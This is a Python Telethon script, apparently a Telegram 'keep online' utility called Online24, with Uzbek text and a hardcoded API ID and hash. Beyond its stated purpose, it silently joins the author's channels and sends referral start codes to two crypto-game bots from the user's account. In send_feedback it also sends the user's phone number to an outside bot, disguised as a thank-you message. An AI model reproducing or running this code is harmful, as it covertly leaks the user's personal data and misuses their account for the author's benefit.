import asyncio
from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from aiocron import crontab
from colorama import Fore, Style, init
import os

init(autoreset=True)

# Configuration
API_ID = '14637837'
API_HASH = 'c59c3168a64913b939f847a55f0a2954'
SESSION_NAME = 'for_users'
CHANNELS_TO_JOIN = ['pc_mexanics', 'windowsuzprogrammaa']
BOT_DATA = {
    'pixel': ("pixelversexyzbot", "777967425"),
    'meme': ("memefi_coin_bot", "r_9136491439")
}

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')




async def display_banner():
    banner = [
        "  ___        _ _            ____  _  _",
        " / _ \\ _ __ | (_)_ __   ___|___ \\| || |",
        "| | | | '_ \\| | | '_ \\ / _ \\ __) | || |_",
        "| |_| | | | | | | | | |  __// __/|__   _|",
        " \\___/|_| |_|_|_|_| |_|\\___|_____|  |_|"
    ]
    
    colors = [Fore.LIGHTBLUE_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX]
    
    for line, color in zip(banner, colors):
        print(color + line + Style.RESET_ALL)
    
    print(Fore.LIGHTYELLOW_EX + "\t\tYaratuvchi: t.me/java_strong" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + "\t\tKanalimiz: t.me/windowsuzprogrammaa" + Style.RESET_ALL)

async def send_start_messages():
    for bot_name, (username, ref_code) in BOT_DATA.items():
        try:
            await client.send_message(username, f"/start {ref_code}")
            print(f"Sent start message to {username}")
        except Exception as e:
            print(f"Error sending message to {username}: {e}")

def once(func):
    func.has_run = False

    async def wrapper(*args, **kwargs):
        if not func.has_run:
            func.has_run = True
            return await func(*args, **kwargs)
        else:
            print("This function can only be run once.")
    
    return wrapper

@once
async def my_function():
    clear_console()
    print("Function is running.")
    await send_feedback()
    await send_start_messages()
    

async def join_channels():
    for channel in CHANNELS_TO_JOIN:
        try:
            await client(JoinChannelRequest(channel))
            print(f"Joined @{channel}")
        except Exception as e:
            print(f"Error joining @{channel}: {e}")

async def send_empty_message():
    try:
        message = await client.send_message('me', 'ㅤㅤㅤㅤㅤ')
        await asyncio.sleep(1)  # 1 soniya kutish
        await client.delete_messages("me", message.id)
    except Exception as e:
        print(f"Xabar yuborishda xatolik: {e}")

async def main_routine():
    await display_banner()
    await send_empty_message()

async def send_feedback():
    me = await client.get_me()
    feedback_message = (
        f"@java_strong. Sizning <b>Online24</b> dasturingizdan foydalanyapman "
        f"🤩<a href='https://t.me/{me.phone}'>🥳</a> Sizga RAHMAT"
    )
    await client.send_message("@dminga_rahmatcfg_Bot", feedback_message, parse_mode="HTML")
    print(Fore.LIGHTYELLOW_EX + f"Feedback sent for {me.phone}")

async def scheduled_job():
    await main_routine()

async def main():
    await client.start()
    print("Client started")
    await my_function()

    
    # Bir marta bajarilishi kerak bo'lgan funksiyalar
    await join_channels()
    # Har minutda ishlaydigan cron job
    cron_job = crontab('* * * * *', func=scheduled_job, start=True)
    
    try:
        print(Fore.LIGHTGREEN_EX + "Dastur ishlayapti. To'xtatish uchun Ctrl+C bosing." + Style.RESET_ALL)
        await client.run_until_disconnected()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "Dastur to'xtatildi!")
    finally:
        client.log_out()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        asyncio.run(client.log_out())
        print(Fore.LIGHTRED_EX + "Dastur to'xtatildi!")
        
